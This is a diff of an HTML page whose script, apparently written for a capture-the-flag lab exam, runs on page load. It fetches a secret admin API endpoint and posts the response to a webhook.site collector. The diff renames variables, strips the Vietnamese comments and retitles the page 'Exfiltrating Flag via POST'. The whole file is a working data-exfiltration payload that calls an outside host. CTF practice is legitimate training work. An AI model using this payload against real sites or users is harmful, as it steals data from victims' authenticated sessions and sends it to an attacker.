@@ -2,36 +2,36 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Auto Fetch and Send</title>
+    <title>Exfiltrating Flag via POST</title>
 </head>
 <body>
-    <h1>Flag is being fetched...</h1>
+    <h1>Flag Stealing In Progress</h1>
     <script>
         (function () {
-            const targetURL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
-            const webhookURL = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
+            const webhook = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
+            const flagURL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
 
-            // Gửi dữ liệu JSON về webhook
             function sendToWebhook(data) {
-                fetch(webhookURL, {
+                fetch(webhook, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
                     body: JSON.stringify(data)
-                }).catch(err => console.error("Webhook send failed:", err));
+                }).catch(e => console.error("Webhook error", e));
             }
 
-            // Lấy dữ liệu từ API và gửi về webhook
-            fetch(targetURL)
-                .then(response => response.json())
-                .then(data => {
+            fetch(flagURL)
+                .then(res => res.json())
+                .then(json => {
                     sendToWebhook({
-                        stage: "fetched_flag_success",
-                        data: data
+                        stage: "FLAG2_RETRIEVED_SUCCESS",
+                        flag_payload: json
                     });
                 })
                 .catch(err => {
                     sendToWebhook({
-                        stage: "fetch_failed",
+                        stage: "FETCH_ERROR",
                         error: err.toString()
                     });
                 });
